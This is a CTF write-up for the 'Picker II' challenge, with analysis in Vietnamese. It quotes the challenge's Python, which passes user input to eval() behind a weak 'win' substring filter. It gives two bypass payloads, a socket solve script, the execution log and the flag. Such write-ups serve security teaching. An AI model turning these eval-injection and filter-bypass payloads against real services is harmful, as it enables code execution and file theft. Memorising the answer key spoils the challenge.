# Writeup: Picker II

## Header & Metadata
- **Challenge:** Picker II (ID: 401)
- **CTF Event / Platform:** CyLab Security Academy
- **Category:** Reverse Engineering
- **Server / Instance:** `nc xebec.cylabacademy.net 15712`
- **Attached Files:** `picker-II.py`
- **Official Flag:** `academy{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_c9aa7a3c}`

---

## Mô tả bài toán (Overview / Analysis)
Can you figure out how this program works to get the flag?

### Hints
- Can you do what `win` does with your input to the program?

---

## Chi tiết kỹ thuật (Technical Deep-Dive)
Chương trình [picker-II.py](file:///C:/Users/lowkeyprod/cylab-ctf/challenges/Reverse_Engineering/Picker_II/picker-II.py) nhận đầu vào của người dùng và lọc chuỗi con `'win'`:
```python
def filter(user_input):
  if 'win' in user_input:
    return False
  return True
```
Sau đó thực thi qua `eval(user_input + '()')`:
```python
while(True):
  try:
    user_input = input('==> ')
    if( filter(user_input) ):
      eval(user_input + '()')
    else:
      print('Illegal input')
  except Exception as e:
    print(e)
    break
```

Hàm `win()` trong chương trình đọc nội dung từ file `flag.txt`:
```python
def win():
  flag = open('flag.txt', 'r').read()
  flag = flag.strip()
  str_flag = ''
  for c in flag:
    str_flag += str(hex(ord(c))) + ' '
  print(str_flag)
```

### Phương pháp khai thác (Vulnerabilities & Exploitation)
Có hai cách tiếp cận để bypass bộ lọc:
1. **Làm trực tiếp điều `win` làm (Theo gợi ý đề bài):**
   - Payload gửi vào: `print(open('flag.txt').read())`
   - Chuỗi không chứa từ khóa `'win'` nên vượt qua `filter()`.
   - `eval(user_input + '()')` sẽ tính giá trị của `print(open('flag.txt').read())()`.
   - Hàm `print` thực thi trước và in flag ra màn hình. Khi cố gọi kết quả trả về `None()` sẽ gây `TypeError: 'NoneType' object is not callable`, nhưng flag đã được gửi về client.
2. **Gọi hàm `win` gián tiếp bằng reflection / string concatenation:**
   - Payload gửi vào: `globals()['w'+'in']`
   - Chuỗi không chứa `'win'` dưới dạng substring.
   - Khi ghép thêm `()`, biểu thức trở thành `globals()['w'+'in']()` gọi trực tiếp hàm `win()` và in mã hex của từng ký tự trong cờ.

---

## Mã nguồn khai thác (Solve Script / Exploit)
```python
#!/usr/bin/env python3
"""
Solve script for Picker II (#401)
Target: xebec.cylabacademy.net:15712
"""
import re
import socket
from pathlib import Path

def get_target_conn():
    cfg_file = Path(__file__).resolve().parent / "connection.cfg"
    host, port = "xebec.cylabacademy.net", 15712
    if cfg_file.exists():
        for line in cfg_file.read_text().splitlines():
            if line.startswith("HOST=") and line.split("=", 1)[1]:
                host = line.split("=", 1)[1].strip()
            elif line.startswith("PORT=") and line.split("=", 1)[1]:
                try:
                    port = int(line.split("=", 1)[1].strip())
                except Exception:
                    pass
    return host, port

def solve():
    host, port = get_target_conn()
    print(f"[*] Connecting to {host}:{port}...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5.0)
    s.connect((host, port))
    
    # Wait for prompt
    data = b""
    while b"==> " not in data:
        chunk = s.recv(1024)
        if not chunk:
            break
        data += chunk
    
    # Send payload that bypasses 'win' check and prints the flag
    s.sendall(b"print(open('flag.txt').read())\n")
    
    # Collect response
    resp = b""
    while True:
        try:
            chunk = s.recv(1024)
            if not chunk:
                break
            resp += chunk
        except socket.timeout:
            break
    s.close()
    
    output = resp.decode(errors="ignore")
    match = re.search(r"academy\{[^}]+\}", output)
    if match:
        flag = match.group(0)
        print(f"[+] Flag found: {flag}")
        flag_path = Path(__file__).resolve().parent / "flag.txt"
        flag_path.write_text(flag)
        return flag
    else:
        print("[-] Flag not found in output:")
        print(output)
        return None

if __name__ == "__main__":
    solve()
```

---

## Log thực thi & Flag (Output & Verification)
```text
[*] Connecting to xebec.cylabacademy.net:15712...
[+] Flag found: academy{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_c9aa7a3c}
[OK] Flag is CORRECT!
```
